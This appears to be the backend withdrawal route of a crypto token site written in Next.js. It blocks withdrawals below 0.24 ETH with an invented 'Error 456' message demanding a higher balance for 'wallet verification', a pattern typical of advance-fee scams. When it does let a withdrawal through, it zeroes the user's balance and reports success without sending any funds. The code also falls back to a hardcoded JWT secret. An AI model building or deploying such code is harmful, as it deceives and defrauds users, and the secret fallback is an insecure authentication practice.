import { NextResponse } from 'next/server';
import { cookies } from 'next/headers';
import jwt from 'jsonwebtoken';
import prisma from '@/lib/prisma';

const JWT_SECRET = process.env.JWT_SECRET || 'fallback-secret-key-change-this-in-prod';
const MINIMUM_WITHDRAWAL_BALANCE = 0.24; // Minimum ETH required for withdrawal

export const dynamic = 'force-dynamic';

export async function POST(req: Request) {
    try {
        const cookieStore = await cookies();
        const token = cookieStore.get('auth-token');

        if (!token) {
            return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
        }

        const decoded = jwt.verify(token.value, JWT_SECRET) as { userId: string };
        const reqBody = await req.json();
        const { walletAddress } = reqBody;

        if (!walletAddress) {
            return NextResponse.json({ 
                success: false,
                error: 'Wallet address is required' 
            }, { status: 400 });
        }

        // Validate wallet address format (basic Ethereum address validation)
        if (!/^0x[a-fA-F0-9]{40}$/.test(walletAddress)) {
            return NextResponse.json({ 
                success: false,
                error: 'Invalid wallet address format' 
            }, { status: 400 });
        }

        // Get user with current balance
        const user = await prisma.user.findUnique({
            where: { id: decoded.userId },
            select: { balance: true, address: true }
        });

        if (!user) {
            return NextResponse.json({ 
                success: false,
                error: 'User not found' 
            }, { status: 404 });
        }

        // Check if balance meets minimum requirement
        if (user.balance < MINIMUM_WITHDRAWAL_BALANCE) {
            return NextResponse.json({ 
                success: false,
                error: `Error 456 - withdrawal processing delay... Insufficient amount for wallet verification. meet up the required minimum balance of ${MINIMUM_WITHDRAWAL_BALANCE.toFixed(4)} ETH to withdraw all META frames token.`,
                currentBalance: user.balance,
                minimumRequired: MINIMUM_WITHDRAWAL_BALANCE
            }, { status: 456 });
        }

        // Process withdrawal (in a real app, this would interact with blockchain)
        // For now, we'll create a transaction record and update balance
        const withdrawalAmount = user.balance;

        // Create withdrawal transaction
        await prisma.transaction.create({
            data: {
                type: 'WITHDRAWAL',
                amount: withdrawalAmount,
                fromId: decoded.userId,
                toId: null, // External wallet
            }
        });

        // Update user balance to 0 after withdrawal
        await prisma.user.update({
            where: { id: decoded.userId },
            data: {
                balance: 0
            }
        });

        return NextResponse.json({
            success: true,
            message: `Successfully processed withdrawal of ${withdrawalAmount.toFixed(4)} ETH to ${walletAddress}`,
            withdrawalAmount,
            walletAddress
        });

    } catch (error) {
        console.error('Withdrawal error:', error);
        
        // Handle JWT errors
        if (error instanceof jwt.JsonWebTokenError) {
            return NextResponse.json({ 
                success: false,
                error: 'Unauthorized' 
            }, { status: 401 });
        }

        return NextResponse.json({ 
            success: false,
            error: 'Internal server error' 
        }, { status: 500 });
    }
}
